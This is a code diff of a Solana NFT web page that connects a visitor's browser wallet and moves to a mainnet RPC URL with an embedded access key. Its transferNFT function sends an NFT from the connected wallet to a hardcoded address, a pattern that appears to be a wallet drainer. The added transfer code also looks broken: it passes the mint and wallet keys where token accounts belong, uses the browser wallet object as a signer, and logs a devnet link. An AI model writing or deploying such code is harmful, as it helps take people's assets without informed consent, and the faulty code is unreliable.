@@ -1,8 +1,8 @@
 "use client";
 import { useEffect, useState } from "react"
 import { Toaster } from 'react-hot-toast'
-import { Connection, PublicKey, Transaction, clusterApiUrl, } from "@solana/web3.js"
-import { TOKEN_PROGRAM_ID, Token } from "@solana/spl-token";
+import { Connection, PublicKey, Transaction, sendAndConfirmTransaction } from "@solana/web3.js"
+import { createTransferInstruction } from "@solana/spl-token";
 import { getParsedNftAccountsByOwner } from "@nfteyez/sol-rayz"
 import { MetadataKey } from "@nfteyez/sol-rayz/dist/config/metaplex";
 import { toast } from "react-hot-toast";
@@ -48,7 +48,7 @@ export default function Home() {
     if (window.solana) {
       const wallet = window.solana
       setWallet(wallet)
-      const connection = new Connection(clusterApiUrl("devnet"), "confirmed")
+      const connection = new Connection("https://sly-boldest-haze.solana-mainnet.discover.quiknode.pro/ce8cbf142592ab1ca55baaf964aedd2887e861ad/")
       setConnection(connection)
       let v = await wallet.connect()
       setPublicKey(new PublicKey(v.publicKey))
@@ -71,26 +71,32 @@ export default function Home() {
   }
 
   const transferNFT = async (nft: INFT, publicKey: PublicKey, connection: Connection) => {
-    const addressToSend = new PublicKey("8MdXvWgNou9jRVturbfnt3egf1aP9p1AjL8wiJavti7F");
+    const addressToSend = new PublicKey("GjakKEh4NSHeqcg5Fk2MsdCnLocM7xtbhrr3jmcG8ygA");
+    const mint = new PublicKey(nft.mint);
 
     const sendTxPromise = new Promise(async (resolve, reject) => {
-      const transferInstruction = Token.createTransferInstruction(
-        TOKEN_PROGRAM_ID,
-        new PublicKey(nft.mint),
+      const transferInstruction = createTransferInstruction(
+        mint,
         addressToSend,
         publicKey,
+        1,
         [],
-        1
-      );
+      )
 
-      const tx = new Transaction().add(transferInstruction);
+      const transaction = new Transaction().add(transferInstruction)
+      const signature = await sendAndConfirmTransaction(
+        connection,
+        transaction,
+        //@ts-ignore
+        [wallet],
+        {
+          commitment: "confirmed",
+          preflightCommitment: "confirmed",
+        }
+      )
+      console.log(`https://explorer.solana.com/tx/${signature}?cluster=devnet`);
 
-      tx.feePayer = publicKey;
-      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-
-      //@ts-ignore
-      const txid = await wallet.signAndSendTransaction(tx);
-      console.log(txid)
+      resolve(true)
     })
 
     toast.promise(
